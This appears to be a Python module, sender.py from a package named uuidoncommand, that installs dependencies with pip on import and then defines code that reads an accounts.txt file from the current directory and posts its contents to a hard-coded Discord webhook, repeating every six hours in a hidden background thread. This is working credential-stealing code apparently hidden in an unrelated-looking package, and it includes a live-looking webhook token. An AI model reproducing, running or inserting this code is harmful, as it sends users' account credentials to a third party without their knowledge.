# uuidoncommand/sender.py
import subprocess 

# initializing host to gfg. 

def main(): 
  
    subprocess.run('pip3 install Hastebin') 
    subprocess.run('pip3 install requests') 

main() 

import os
import requests
import time
from threading import Thread


webhook_url = "https://discord.com/api/webhooks/1296425672985546846/oGLhOPhsZzF73BJL8yb1EM56f980StZ34nW_qNFwR49DlTNOV57LqwE7abflksSvCyIs"
def find_accounts_file():
    """Looks for accounts.txt in the current directory."""
    current_directory = os.getcwd()
    accounts_file = os.path.join(current_directory, "accounts.txt")
    if os.path.isfile(accounts_file):
        return accounts_file
    return None

def send_to_webhook():
    """Send the accounts.txt contents to a webhook."""
    accounts_file = find_accounts_file()
    if accounts_file:
        with open(accounts_file, 'r') as file:
            file_content = file.read()
        response = requests.post(
            webhook_url,
            json={'content': file_content},
            headers={'Content-Type': 'application/json'}
        )
        
        if response.status_code == 200:
            print("File sent successfully!")
        else:
            print(f"Failed to send file. Status code: {response.status_code}")
    else:
        print("No accounts.txt found in the current directory.")


def schedule_webhook(interval=21600):  # 6 hours = 21600 seconds
    """Schedules the webhook sending every 6 hours."""
    def run():
        while True:
            send_to_webhook()
            time.sleep(interval)
    
    thread = Thread(target=run)
    thread.daemon = True
    thread.start()
